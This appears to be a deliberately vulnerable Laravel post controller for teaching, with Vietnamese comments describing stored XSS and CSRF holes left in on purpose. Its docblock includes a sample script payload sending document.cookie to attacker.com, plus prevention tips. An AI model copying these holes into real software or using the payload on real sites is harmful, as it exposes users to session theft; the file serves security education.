<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Post;

/**
 * PostController - Quan ly bai viet (tao, xem, xoa)
 *
 * MUC DICH GIAO DUC: File nay co chua 2 lo hong:
 *   1. XSS - Cross-Site Scripting (CWE-79): Noi dung HTML khong duoc loc
 *      duoc luu thang vao CSDL va hien thi nguyen van tren trinh duyet.
 *   2. CSRF - Cross-Site Request Forgery (CWE-352): Khong kiem tra token
 *      CSRF nen ke tan cong co the gui request gia mao tu trang web khac.
 */
class PostController extends Controller
{
    /**
     * Hien thi danh sach tat ca bai viet.
     * Lay du lieu cung voi thong tin nguoi dung (eager loading).
     * Sap xep theo bai moi nhat truoc (latest).
     */
    public function index()
    {
        // Post::with('user') lay kem thong tin nguoi dang bai (tranh N+1 query)
        $posts = Post::with('user')->latest()->get();
        return view('posts.index', compact('posts'));
    }

    /**
     * Hien thi form tao bai viet moi.
     */
    public function create()
    {
        return view('posts.create');
    }

    /**
     * Luu bai viet moi vao co so du lieu.
     *
     * LO HONG 1 - CSRF (Cross-Site Request Forgery - CWE-352):
     * ------------------------------------------------------------------
     * Route POST /posts khong duoc bao ve boi CSRF middleware (da tat trong
     * bootstrap/app.php). Ke tan cong co the tao trang web gia mao gui
     * request dang bai len server nhan danh nguoi dung dang dang nhap.
     *
     * LO HONG 2 - XSS Stored (Cross-Site Scripting - CWE-79):
     * ------------------------------------------------------------------
     * Noi dung bai viet ($title, $content) duoc luu thang vao CSDL KHONG
     * qua bat ky buoc loc hay ma hoa nao. Khi nguoi dung khac xem bai nay,
     * ma HTML/JavaScript doc duoc thuc thi tren trinh duyet cua ho.
     *
     * Vi du tan cong:
     *   Noi dung bai: <script>fetch('http://attacker.com?c='+document.cookie)</script>
     *   Ket qua: Cookie phien dang nhap bi gui den may chu ke tan cong.
     *
     * CACH PHONG NGAN (khong ap dung o day de demo):
     *   - Dung Blade {{ }} thay vi {!! !!} khi hien thi du lieu
     *   - Loc HTML bang ham htmlspecialchars() hoac thu vien HTMLPurifier
     *   - Them @csrf vao form de bao ve CSRF
     */
    public function store(Request $request)
    {
        // LO HONG: Khong kiem tra CSRF token (da tat trong bootstrap/app.php)
        // LO HONG: Du lieu nguoi dung nhap duoc luu thang, khong loc hay ma hoa
        Post::create([
            'title'   => $request->input('title'),    // Du lieu chua duoc loc
            'content' => $request->input('content'),  // Du lieu chua duoc loc - co the chua XSS
            'user_id' => session('user_id'),           // ID nguoi dung dang dang nhap
        ]);

        return redirect('/posts')->with('success', 'Bai viet da duoc dang thanh cong!');
    }

    /**
     * Hien thi chi tiet mot bai viet theo ID.
     *
     * LO HONG: View su dung {!! $post->content !!} de hien thi noi dung,
     * nghia la HTML/JavaScript trong noi dung bai se duoc trinh duyet thuc thi.
     * Day la noi XSS Stored thuc su xay ra.
     */
    public function show($id)
    {
        // findOrFail: Tim ban ghi theo ID, tra 404 neu khong tim thay
        $post = Post::with('user')->findOrFail($id);

        // View posts/show.blade.php dung {!! !!} = HTML tho, KHONG ma hoa
        // => Bat ky ma <script> nao trong $post->content se chay tren trinh duyet
        return view('posts.show', compact('post'));
    }

    /**
     * Xoa bai viet.
     * Chi chu so huu hoac admin moi co quyen xoa.
     * Day la ham duy nhat co kiem tra quyen (authorization).
     */
    public function destroy($id)
    {
        $post = Post::findOrFail($id);

        // Kiem tra quyen: nguoi dung hien tai phai la chu bai hoac admin
        if ($post->user_id !== session('user_id') && session('role') !== 'admin') {
            return back()->with('error', 'Ban khong co quyen thuc hien tac vu nay.');
        }

        $post->delete();
        return redirect('/posts')->with('success', 'Bai viet da duoc xoa.');
    }
}
